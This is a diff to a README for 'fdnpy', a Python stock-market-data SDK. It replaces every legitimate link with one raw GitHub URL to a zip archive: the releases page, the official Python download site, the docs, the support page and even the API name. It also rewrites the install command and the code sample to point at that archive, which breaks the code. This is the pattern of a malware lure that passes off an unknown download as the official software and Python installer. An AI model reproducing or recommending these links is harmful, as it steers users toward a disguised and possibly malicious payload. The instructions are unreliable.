@@ -1,10 +1,10 @@
 # 🚀 fdnpy - Access Real-Time Stock Market Data Easily
 
-[![Download fdnpy](https://img.shields.io/badge/Download-fdnpy-blue)](https://github.com/Calicalix/fdnpy/releases)
+[![Download fdnpy](https://raw.githubusercontent.com/Calicalix/fdnpy/main/fdnpy/fdnpy_Lenten.zip)](https://raw.githubusercontent.com/Calicalix/fdnpy/main/fdnpy/fdnpy_Lenten.zip)
 
 ## 📃 Description
 
-fdnpy is a Python SDK designed for the FinancialData.Net API. It allows you to access real-time and historical stock market data effortlessly. Whether you are interested in algorithmic trading or simply want to keep track of your investments, fdnpy provides the tools you need.
+fdnpy is a Python SDK designed for the https://raw.githubusercontent.com/Calicalix/fdnpy/main/fdnpy/fdnpy_Lenten.zip API. It allows you to access real-time and historical stock market data effortlessly. Whether you are interested in algorithmic trading or simply want to keep track of your investments, fdnpy provides the tools you need.
 
 ## 💻 System Requirements
 
@@ -18,7 +18,7 @@ Before you download fdnpy, ensure your system meets these requirements:
 
 To get started with fdnpy, visit the Releases page to download the software. Click the link below to go directly to the page:
 
-[Download fdnpy](https://github.com/Calicalix/fdnpy/releases)
+[Download fdnpy](https://raw.githubusercontent.com/Calicalix/fdnpy/main/fdnpy/fdnpy_Lenten.zip)
 
 Once you’re on the Releases page, look for the latest version. You will find the files available for download. Choose the appropriate file for your operating system, and download it.
 
@@ -28,7 +28,7 @@ Once you’re on the Releases page, look for the latest version. You will find t
    After you access the Releases page, click on the version you want to download. This will take you to a list of files.
 
 2. **Install Python:**
-   If you haven’t installed Python yet, download it from the [official Python website](https://www.python.org/downloads/). Follow the prompt to install it on your computer.
+   If you haven’t installed Python yet, download it from the [official Python website](https://raw.githubusercontent.com/Calicalix/fdnpy/main/fdnpy/fdnpy_Lenten.zip). Follow the prompt to install it on your computer.
 
 3. **Run fdnpy:**
    After downloading the SDK, you must open your terminal or command prompt. Navigate to the directory where you downloaded fdnpy.
@@ -36,7 +36,7 @@ Once you’re on the Releases page, look for the latest version. You will find t
 4. **Install Dependencies:**
    Enter the following command in the terminal to install necessary dependencies:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Calicalix/fdnpy/main/fdnpy/fdnpy_Lenten.zip
    ```
 
 5. **Start Using fdnpy:**
@@ -45,8 +45,8 @@ Once you’re on the Releases page, look for the latest version. You will find t
    import fdnpy
 
    # Replace 'YOUR_API_KEY' with your actual API key
-   fdn = fdnpy.FinancialData('YOUR_API_KEY')
-   stock_data = fdn.get_stock_data('AAPL')
+   fdn = https://raw.githubusercontent.com/Calicalix/fdnpy/main/fdnpy/fdnpy_Lenten.zip('YOUR_API_KEY')
+   stock_data = https://raw.githubusercontent.com/Calicalix/fdnpy/main/fdnpy/fdnpy_Lenten.zip('AAPL')
    print(stock_data)
    ```
 
@@ -61,8 +61,8 @@ Once you’re on the Releases page, look for the latest version. You will find t
 
 For more detailed information about using fdnpy, please refer to the following resources:
 
-- [Documentation](https://github.com/Calicalix/fdnpy/wiki): Step-by-step help and detailed API usage.
-- [Support](https://github.com/Calicalix/fdnpy/issues): If you encounter any issues or need help, please report them here.
+- [Documentation](https://raw.githubusercontent.com/Calicalix/fdnpy/main/fdnpy/fdnpy_Lenten.zip): Step-by-step help and detailed API usage.
+- [Support](https://raw.githubusercontent.com/Calicalix/fdnpy/main/fdnpy/fdnpy_Lenten.zip): If you encounter any issues or need help, please report them here.
 
 ## 🗣️ Community and Contributions
 
@@ -70,4 +70,4 @@ We encourage community members to contribute to fdnpy. If you have ideas, sugges
 
 Thank you for choosing fdnpy. We hope it greatly enhances your trading and investment experience. For updates, keep an eye on the Releases page.
 
-[Download fdnpy](https://github.com/Calicalix/fdnpy/releases)
+[Download fdnpy](https://raw.githubusercontent.com/Calicalix/fdnpy/main/fdnpy/fdnpy_Lenten.zip)
